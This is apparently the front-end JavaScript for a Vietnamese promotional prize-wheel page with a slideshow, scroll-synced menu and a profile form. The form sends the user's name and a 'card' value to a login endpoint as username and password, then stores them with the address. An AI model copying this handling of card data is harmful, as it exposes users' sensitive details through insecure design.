// Hàm sử dụng requestAnimationFrame để tối ưu hóa sự kiện scroll
function rafThrottle(callback) {
    let requestId = null;
    let lastArgs = null;

    const next = () => {
        if (lastArgs) {
            callback(...lastArgs);
            lastArgs = null;
            requestId = requestAnimationFrame(next);
        } else {
            requestId = null;
        }
    };

    return function (...args) {
        lastArgs = args;
        if (!requestId) {
            requestId = requestAnimationFrame(next);
        }
    };
}

// Hàm quay vòng
window.spinWheel = function(wheelId = 'wheel', innerId = 'wheel-inner', notificationId = 'result-notification') {
    const wheel = document.getElementById(wheelId);
    const wheelInner = document.getElementById(innerId);
    const resultNotification = document.getElementById(notificationId);
    let spinning = wheel.dataset.spinning !== 'true';

    if (!spinning) return;

    wheel.dataset.spinning = 'true';
    const randomDegrees = Math.floor(Math.random() * 360) + 1080;
    const prize = Math.floor(Math.random() * 999) + 1;

    wheel.style.transform = `rotate(${randomDegrees}deg)`;
    wheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';

    setTimeout(() => {
        wheelInner.textContent = prize.toString().padStart(3, '0');
    }, 4000);

    setTimeout(() => {
        wheel.style.transition = 'transform 1s ease-out';
        wheel.style.transform = 'rotate(0deg)';

        let rewardMessage = '';
        if (prize <= 100) {
            rewardMessage = 'Bạn nhận được: GIẢM GIÁ 10% TỚI 7 - ON...';
        } else if (prize <= 200) {
            rewardMessage = 'Bạn nhận được: THƯỞNG BIA HEINEKEN...';
        } else if (prize <= 300) {
            rewardMessage = 'Bạn nhận được: THƯỞNG BIA SÁT GỌN...';
        } else if (prize <= 400) {
            rewardMessage = 'Bạn nhận được: THƯỞNG ĐẶC BIỆT...';
        } else if (prize <= 700) {
            rewardMessage = 'Bạn nhận được: THƯỞNG SIÊU PHẨM...';
        } else {
            rewardMessage = 'Bạn nhận được: JACKPOT - GIẢM GIÁ 50%!';
        }
        resultNotification.textContent = `Số điểm: ${prize}. ${rewardMessage}`;
        resultNotification.classList.add('active');

        wheel.dataset.spinning = 'false';

        setTimeout(() => {
            resultNotification.classList.remove('active');
            wheelInner.textContent = '000';
        }, 4000);
    }, 4000);
};

// Hàm toggle chi tiết
window.toggleDetails = function() {
    const detailsContainer = document.getElementById('details-container');
    detailsContainer.style.display = detailsContainer.style.display === 'none' ? 'block' : 'none';
};

// Xử lý profile và menu
document.addEventListener('DOMContentLoaded', () => {
    const profileBtn = document.querySelector('.profile-btn');
    const profileInfo = document.querySelector('.profile-info');
    const nameInput = document.getElementById('name');
    const cardInput = document.getElementById('card');
    const addressInput = document.getElementById('address');
    const saveBtn = document.getElementById('save-profile');
    const loginError = document.getElementById('login-error');
    const notification = document.getElementById('notification');
    const menuIcons = document.querySelectorAll('.menu-icon');

    // Toggle profile info
    profileBtn.addEventListener('click', (event) => {
        event.preventDefault();
        profileInfo.classList.toggle('active');
    });

    document.addEventListener('click', (event) => {
        if (!profileBtn.contains(event.target) && !profileInfo.contains(event.target)) {
            profileInfo.classList.remove('active');
        }
    });

    // Handle save profile
    saveBtn.addEventListener('click', async () => {
        const name = nameInput.value.trim();
        const card = cardInput.value.trim();
        const address = addressInput.value.trim();
        const profile = {
            name,
            card,
            address,
            timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' })
        };

        if (name && card && address) {
            try {
                const loginResponse = await fetch('backend/login.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: name, password: card })
                });
                const loginData = await loginResponse.json();

                if (loginResponse.ok && loginData.success) {
                    const profileResponse = await fetch('backend/profiles.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(profile)
                    });

                    if (profileResponse.ok) {
                        notification.classList.add('active');
                        setTimeout(() => notification.classList.remove('active'), 3000);
                        profileInfo.classList.remove('active');
                        nameInput.value = '';
                        cardInput.value = '';
                        addressInput.value = '';
                    } else {
                        throw new Error('Failed to save profile');
                    }
                } else {
                    loginError.style.display = 'block';
                    loginError.textContent = loginData.message || 'Invalid login credentials!';
                }
            } catch (error) {
                console.error('Error:', error);
                loginError.style.display = 'block';
                loginError.textContent = 'System error. Please try again!';
            }
        } else {
            loginError.style.display = 'block';
            loginError.textContent = 'Please fill in all fields!';
        }
    });

    // Menu logic
    let lastActiveIndex = 0;
    function updateMenuState() {
        const scrollPosition = window.scrollY;
        const headerHeight = document.querySelector('.header').offsetHeight || 0;
        const menuHeight = document.querySelector('.new-menu').offsetHeight || 0;
        const adjustedScroll = scrollPosition + headerHeight + menuHeight;

        const slideshow = document.getElementById('slideshow-container').offsetTop;
        const wheelSection = document.getElementById('wheel-section').offsetTop;
        const wheel1Section = document.getElementById('wheel1-section').offsetTop;
        const wheel2Section = document.getElementById('wheel2-section').offsetTop;
        const buffer = 50;

        const menuIcons = document.querySelectorAll('.menu-icon');
        let activeIndex = lastActiveIndex;

        if (adjustedScroll >= wheel2Section - buffer) activeIndex = 3;
        else if (adjustedScroll >= wheel1Section - buffer) activeIndex = 2;
        else if (adjustedScroll >= wheelSection - buffer) activeIndex = 1;
        else activeIndex = 0;

        if (activeIndex !== lastActiveIndex) {
            menuIcons.forEach(icon => {
                icon.classList.remove('active');
                icon.style.filter = 'brightness(0.5) invert(1)';
                icon.style.border = 'none';
            });
            menuIcons[activeIndex].classList.add('active');
            menuIcons[activeIndex].style.filter = 'none';
            menuIcons[activeIndex].style.border = '3px solid #ffd700';
            lastActiveIndex = activeIndex;
        }

        // Hiển thị tất cả section, chỉ kích hoạt section tương ứng
        document.getElementById('slideshow-container').style.display = 'block';
        document.getElementById('wheel-section').style.display = 'block';
        document.getElementById('wheel1-section').style.display = 'block';
        document.getElementById('wheel2-section').style.display = 'block';
    }

    menuIcons.forEach((icon, index) => {
        icon.addEventListener('click', (event) => {
            if (!icon.disabled) {
                event.preventDefault();
                const targetId = icon.getAttribute('data-target');
                console.log(`Nút ${index + 1} bấm: ${targetId}`);
                const targetElement = document.querySelector(targetId) || document.getElementById('slideshow-container');
                const headerHeight = document.querySelector('.header').offsetHeight;
                const menuHeight = document.querySelector('.new-menu').offsetHeight;
                const y = targetElement.offsetTop - headerHeight - menuHeight;
                window.scrollTo({ top: y, behavior: 'smooth' });

                // Cập nhật trạng thái nút
                menuIcons.forEach(i => {
                    i.classList.remove('active');
                    i.style.filter = 'brightness(0.5) invert(1)';
                    i.style.border = 'none';
                });
                icon.classList.add('active');
                icon.style.filter = 'none';
                icon.style.border = '3px solid #ffd700';

                // Hiển thị tất cả section, cuộn đến section tương ứng
                document.getElementById('slideshow-container').style.display = 'block';
                document.getElementById('wheel-section').style.display = 'block';
                document.getElementById('wheel1-section').style.display = 'block';
                document.getElementById('wheel2-section').style.display = 'block';

                lastActiveIndex = index;
            }
        });
    });

    window.addEventListener('scroll', rafThrottle(updateMenuState));

    // Slideshow Logic
    let slideIndex = 0;
    let autoSlideTimeout;

    function showSlides() {
        let slides = document.querySelectorAll(".slide");
        for (let i = 0; i < slides.length; i++) {
            slides[i].classList.remove("active");
        }
        if (slideIndex >= slides.length) slideIndex = 0;
        if (slideIndex < 0) slideIndex = slides.length - 1;
        slides[slideIndex].classList.add("active");
        slideIndex++;
        clearTimeout(autoSlideTimeout);
        autoSlideTimeout = setTimeout(showSlides, 3000);
    }

    window.changeSlide = function(n) {
        slideIndex += n;
        showSlides();
    };

    showSlides();
});